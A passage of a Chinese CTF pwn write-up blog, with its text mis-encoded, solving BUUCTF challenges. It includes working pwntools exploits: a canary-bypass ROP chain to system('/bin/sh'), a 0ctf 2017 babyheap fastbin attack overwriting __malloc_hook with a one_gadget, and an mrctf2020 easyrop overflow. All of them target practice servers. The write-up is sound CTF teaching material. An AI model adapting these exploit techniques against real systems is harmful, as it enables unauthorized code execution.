class="line"></span><br><span class="line">payload3 = <span class="string">b'A'</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/04/rScmVH2X87ob5iB.png" alt="image.png"></p>
<h1 id="0x02F-jarvisoj-test-your-memory-ret2text"><a href="#0x02F-jarvisoj-test-your-memory-ret2text" class="headerlink" title="0x02F.jarvisoj_test_your_memory - ret2text"></a>0x02F.jarvisoj_test_your_memory - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œ åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/04/RuA5Pk3QrJqXKHd.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/04/IefOqdQ4E6yBMKZ.png" alt="image.png"></p>
<p>å­˜åœ¨æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/12/04/gXN7KSE3T4dzLob.png" alt="image.png"></p>
<p>å­˜åœ¨systemå‡½æ•°</p>
<p><img src="https://i.loli.net/2020/12/04/l7ST1q2FcrGWbUM.png" alt="image.png"></p>
<p>å­˜åœ¨ä¸€ä¸ª<code>cat flag</code>å­—ç¬¦ä¸²</p>
<p>é‚£ç›´æ¥system(â€œcat flagâ€)å°±è¡Œäº†</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯å¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/12/04/uZlcnrhgJo23zpW.png" alt="image.png"></p>
<blockquote>
<p>æ³¨ï¼šè¿™é“é¢˜å¾ˆå‘ï¼Œé¢˜ç›®ç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œéƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šçš„äºŒè¿›åˆ¶æ–‡ä»¶å¤§ç›¸å¾„åº­ï¼Œæ‰€ä»¥æ²¡èƒ½get shellâ€¦</p>
</blockquote>
<h1 id="0x30-ZJCTF-2019-Login"><a href="#0x30-ZJCTF-2019-Login" class="headerlink" title="0x30.[ZJCTF 2019]Login -"></a>0x30.[ZJCTF 2019]Login -</h1><h1 id="0x-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#0x-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="0x???.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget"></a>0x???.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget</h1><p>å‡ºç°é‡å¤çš„é¢˜æ˜¯çœŸçš„ç¦»è°±</p>
<p>è¿‡ç¨‹è§å‰é¢0x013ï¼Œè¿™é‡Œå°±ä¸å†èµ˜å™äº†</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27143</span>)<span class="comment">#process('./babyheap_0ctf_2017')#</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index:int,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/10/19/kJSyCIWmsLdoaOD.png" alt="image.png"></p>
<h1 id="0x-mrctf2020-easyrop-ret2text"><a href="#0x-mrctf2020-easyrop-ret2text" class="headerlink" title="0x???.mrctf2020_easyrop - ret2text"></a>0x???.mrctf2020_easyrop - ret2text</h1><blockquote>
<p>ä»æ¯”è¾ƒé åçš„æ— äººåŒºæŒ‘äº†ä¸€é“ç®€å•é¢˜æ¥åš2333ï¼ˆ<del>ä¸ºäº†æ··åˆ†</del></p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/10/07/9iQUjlYXTmzAKoB.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¸­æ ¹æ®æˆ‘ä»¬æ‰€è¾“å…¥çš„æ•°å­—è¿›å…¥ä¸åŒçš„å‡½æ•°ï¼Œè¾“å…¥7åˆ™åœ¨è¿›å…¥ç›¸åº”çš„å‡½æ•°ä¹‹åé€€å‡º</p>
<p><img src="https://i.loli.net/2020/10/07/zrNR46ytfJ2gcDq.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨èƒ½å¤Ÿç›´æ¥getshellçš„gadget</p>
<p><img src="https://i.loli.net/2020/10/07/LXQr9f2BShwG1bC.png" alt="image.png"></p>
<p>è™½ç„¶è¯´å‡ ä¸ªå‡½æ•°éƒ½æ˜¯å‘mainä¸­çš„v5ä¸Šå†™å…¥ï¼Œä½†æ˜¯æœ€å¤§çš„ä¸€ä¸ªå‡½æ•°ä»…å¯ä»¥å†™å…¥<code>0x300</code>å­—èŠ‚ï¼Œæº¢å‡ºåˆ°rbpè¦<code>0x310</code>å­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/10/07/wzrb1uSvc49oaeO.png" alt="image.png"></p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨<code>byby()</code>å‡½æ•°ä¸­ç¨‹åºä¼šå°†v5çœ‹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶åœ¨å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹è¯»å…¥ç”¨æˆ·è¾“å…¥</p>
<p><img src="https://i.loli.net/2020/10/07/QDHPlT9WFS3gx6K.png" alt="image.png"></p>
<p>ç”±äº<code>hehe()</code>èƒ½å¤Ÿè¯»å…¥0x300å­—èŠ‚ï¼Œæ•…æˆ‘ä»¬è€ƒè™‘å…ˆä½¿ç”¨<code>hehe()</code>å‡½æ•°æ„é€ ä¸€ä¸ªé•¿åº¦ä¸º0x2ffçš„å­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨<code>byby()</code>å‡½æ•°è¿›è¡Œè¯»å…¥ï¼Œä¾¿å¯ä»¥æº¢å‡ºæ§åˆ¶ä¸»å‡½æ•°çš„è¿”å›åœ°å€è¿”å›è‡³<code>system(&quot;/bin/sh&quot;)</code></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29482</span>)<span class="comment">#process('./mrctf2020_easyrop')#</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b'A'</span>*(<span class="number">0x300</span><span class="number">-1</span>)+<span class="string">b'\x00'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'7'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b'A'</span>*<span class="number">0x11</span>+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x40072a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—flag</p>
<p><img src="https://i.loli.net/2020/10/07/TwVOht7dcnsZzbN.png" alt="image.png"></p>

    </div>

    
    
    
        

  <div class="followme">
    <p>Welcome to my other publishing channels</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/arttnba3">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># ä¿¡æ¯å®‰å…¨</a>
              <a href="/tags/PWN/" rel="tag"># PWN</a>
              <a href="/tags/%E5%A0%86/" rel="tag"># å †</a>
              <a href="/tags/ROP/" rel="tag"># ROP</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/ret2text/" rel="tag"># ret2text</a>
              <a href="/tags/python/" rel="tag"># python</a>
              <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag"># æ ˆè¿ç§»</a>
              <a href="/tags/ret2csu/" rel="tag"># ret2csu</a>
              <a href="/tags/ret2libc/" rel="tag"># ret2libc</a>
              <a href="/tags/Integer-Overflow/" rel="tag"># Integer Overflow</a>
              <a href="/tags/Fastbin-Attack/" rel="tag"># Fastbin Attack</a>
              <a href="/tags/Unsorted-bin-Attack/" rel="tag"># Unsorted bin Attack</a>
              <a href="/tags/one-gadget/" rel="tag"># one_gadget</a>
              <a href="/tags/SROP/" rel="tag"># SROP</a>
              <a href="/tags/canary/" rel="tag"># canary</a>
              <a href="/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/" rel="tag"># gotè¡¨åŠ«æŒ</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/" rel="prev" title="ã€CTFé¢˜è§£-0x03ã€‘moeCTF2020-partial official write up by arttnb3">
      <i class="fa fa-chevron-left"></i> ã€CTFé¢˜è§£-0x03ã€‘moeCTF2020-partial official write up by arttnb3
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/09/16/%E3%80%90OJ-0x0004-Leetcode%E3%80%91%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E9%83%A8%E5%88%86write-up-by-arttnba3/" rel="next" title="ã€OJ-0x0004-Leetcodeã€‘æ¯æ—¥ä¸€é¢˜éƒ¨åˆ†write up by arttnba3">
      ã€OJ-0x0004-Leetcodeã€‘æ¯æ—¥ä¸€é¢˜éƒ¨åˆ†write up by arttnba3 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x000-ç»ªè®º"><span class="nav-number">1.</span> <span class="nav-text">0x000.ç»ªè®º</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x001-test-your-nc-nc"><span class="nav-number">2.</span> <span class="nav-text">0x001.test your nc - nc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x002-rip-ret2text"><span class="nav-number">3.</span> <span class="nav-text">0x002.rip - ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x003-warmup-csaw-2016-ret2text"><span class="nav-number">4.</span> <span class="nav-text">0x003.warmup_csaw_2016 - ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x004-pwn1-sctf-2016-ret2text"><span class="nav-number">5.</span> <span class="nav-text">0x004.pwn1_sctf_2016 - ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x005-ciscn-2019-n-1-overwrite"><span class="nav-number">6.</span> <span class="nav-text">0x005.ciscn_2019_n_1 - overwrite</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x006-ciscn-2019-c-1-ret2csu-ret2libc"><span class="nav-number">7.</span> <span class="nav-text">0x006.ciscn_2019_c_1 - ret2csu + ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x007-OGeek2019-babyrop-ret2libc"><span class="nav-number">8.</span> <span class="nav-text">0x007.[OGeek2019]babyrop - ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x008-jarvisoj-level0-ret2text"><span class="nav-number">9.</span> <span class="nav-text">0x008.jarvisoj_level0 - ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x009-ciscn-2019-en-2-ret2csu-ret2libc"><span class="nav-number">10.</span> <span class="nav-text">0x009.ciscn_2019_en_2 - ret2csu + ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00A-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-fmtstr"><span class="nav-number">11.</span> <span class="nav-text">0x00A.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 - fmtstr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00B-BJDCTF-2nd-r2t3-integer-overflow-ret2text"><span class="nav-number">12.</span> <span class="nav-text">0x00B.[BJDCTF 2nd]r2t3 - integer overflow + ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00C-get-started-3dsctf-2016-ret2text-ret2shellcode"><span class="nav-number">13.</span> <span class="nav-text">0x00C.get_started_3dsctf_2016 - ret2text || ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#è§£æ³•1ï¼šret2text"><span class="nav-number">13.1.</span> <span class="nav-text">è§£æ³•1ï¼šret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è§£æ³•2ï¼šret2shellcode"><span class="nav-number">13.2.</span> <span class="nav-text">è§£æ³•2ï¼šret2shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00D-ciscn-2019-n-8-overwrite"><span class="nav-number">14.</span> <span class="nav-text">0x00D.ciscn_2019_n_8 - overwrite</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00E-not-the-same-3dsctf-2016-ret2shellcode"><span class="nav-number">15.</span> <span class="nav-text">0x00E.not_the_same_3dsctf_2016 - ret2shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00F-one-gadget-one-gadget"><span class="nav-number">16.</span> <span class="nav-text">0x00F.one_gadget - one_gadget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x010-jarvisoj-level2-ret2text"><span class="nav-number">17.</span> <span class="nav-text">0x010.jarvisoj_level2 - ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x011-HarekazeCTF2019-baby-rop-ret2text-ret2csu"><span class="nav-number">18.</span> <span class="nav-text">0x011.[HarekazeCTF2019]baby_rop - ret2text + ret2csu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x012-bjdctf-2020-babystack-ret2text"><span class="nav-number">19.</span> <span class="nav-text">0x012.bjdctf_2020_babystack - ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x013-babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><span class="nav-number">20.</span> <span class="nav-text">0x013.babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x014-ciscn-2019-n-5-ret2shellcode"><span class="nav-number">21.</span> <span class="nav-text">0x014.ciscn_2019_n_5 - ret2shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x015-level2-x64-ret2csu"><span class="nav-number">22.</span> <span class="nav-text">0x015.level2_x64 - ret2csu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x016-ciscn-2019-ne-5-ret2text"><span class="nav-number">23.</span> <span class="nav-text">0x016.ciscn_2019_ne_5 - ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x017-ciscn-2019-s-3-ret2csu-SROP"><span class="nav-number">24.</span> <span class="nav-text">0x017.ciscn_2019_s_3 - ret2csu || SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#è§£æ³•1ï¼šret2csu"><span class="nav-number">24.1.</span> <span class="nav-text">è§£æ³•1ï¼šret2csu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è§£æ³•2ï¼šSROP"><span class="nav-number">24.2.</span> <span class="nav-text">è§£æ³•2ï¼šSROP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x018-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-ret2libc"><span class="nav-number">25.</span> <span class="nav-text">0x018.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop - ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x019-bjdctf-2020-babyrop-ret2csu-ret2libc"><span class="nav-number">26.</span> <span class="nav-text">0x019.bjdctf_2020_babyrop - ret2csu + ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01A-pwn2-sctf-2016-integer-overflow-ret2libc"><span class="nav-number">27.</span> <span class="nav-text">0x01A.pwn2_sctf_2016 - integer overflow + ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01B-others-shellcode"><span class="nav-number">28.</span> <span class="nav-text">0x01B.others_shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01C-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc"><span class="nav-number">29.</span> <span class="nav-text">0x01C.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01D-ez-pz-hackover-2016-ret2shellcode"><span class="nav-number">30.</span> <span class="nav-text">0x01D.ez_pz_hackover_2016 - ret2shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01E-ciscn-2019-es-2-ret2text-stack-migration"><span class="nav-number">31.</span> <span class="nav-text">0x01E.ciscn_2019_es_2 - ret2text + stack migration</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01F-Black-Watch-å…¥ç¾¤é¢˜-PWN-ret2libc-stack-migration"><span class="nav-number">32.</span> <span class="nav-text">0x01F.[Black Watch å…¥ç¾¤é¢˜]PWN - ret2libc + stack migration</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x020-jarvisoj-level3-ret2libc"><span class="nav-number">33.</span> <span class="nav-text">0x020.jarvisoj_level3 - ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x021-BJDCTF-2nd-test-LinuxåŸºç¡€çŸ¥è¯†"><span class="nav-number">34.</span> <span class="nav-text">0x021.[BJDCTF 2nd]test - LinuxåŸºç¡€çŸ¥è¯†</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x022-BJDCTF-2nd-r2t4-fmtstr"><span class="nav-number">35.</span> <span class="nav-text">0x022.[BJDCTF 2nd]r2t4 - fmtstr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x023-jarvisoj-fm-fmtstr"><span class="nav-number">36.</span> <span class="nav-text">0x023.jarvisoj_fm - fmtstr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x024-jarvisoj-tell-me-something-ret2csu-ret2libc"><span class="nav-number">37.</span> <span class="nav-text">0x024.jarvisoj_tell_me_something - ret2csu + ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x025-BJDCTF-2nd-ydsneedgirlfriend2-overwrite"><span class="nav-number">38.</span> <span class="nav-text">0x025.[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x026-jarvisoj-level4-ret2libc"><span class="nav-number">39.</span> <span class="nav-text">0x026.jarvisoj_level4 - ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x027-V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget"><span class="nav-number">40.</span> <span class="nav-text">0x027.[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x028-jarvisoj-level3-x64-ret2csu-ret2libc"><span class="nav-number">41.</span> <span class="nav-text">0x028.jarvisoj_level3_x64 - ret2csu + ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x029-bjdctf-2020-babystack2-integer-overflow-ret2text"><span class="nav-number">42.</span> <span class="nav-text">0x029.bjdctf_2020_babystack2 - integer overflow + ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02A-hitcontraining-uaf-UAF-fastbin-double-free"><span class="nav-number">43.</span> <span class="nav-text">0x02A.hitcontraining_uaf - UAF + fastbin double free</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02B-ZJCTF-2019-EasyHeap-fastbin-attack"><span class="nav-number">44.</span> <span class="nav-text">0x02B.[ZJCTF 2019]EasyHeap - fastbin attack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02C-babyfengshui-33c3-2016-got-table-hijack"><span class="nav-number">45.</span> <span class="nav-text">0x02C.babyfengshui_33c3_2016 - got table hijack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02D-picoctf-2018-rop-chain-ret2libc"><span class="nav-number">46.</span> <span class="nav-text">0x02D.picoctf_2018_rop chain - ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02E-bjdctf-2020-babyrop2-fmtstr-ret2libc"><span class="nav-number">47.</span> <span class="nav-text">0x02E.bjdctf_2020_babyrop2 - fmtstr + ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02F-jarvisoj-test-your-memory-ret2text"><span class="nav-number">48.</span> <span class="nav-text">0x02F.jarvisoj_test_your_memory - ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x30-ZJCTF-2019-Login"><span class="nav-number">49.</span> <span class="nav-text">0x30.[ZJCTF 2019]Login -</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><span 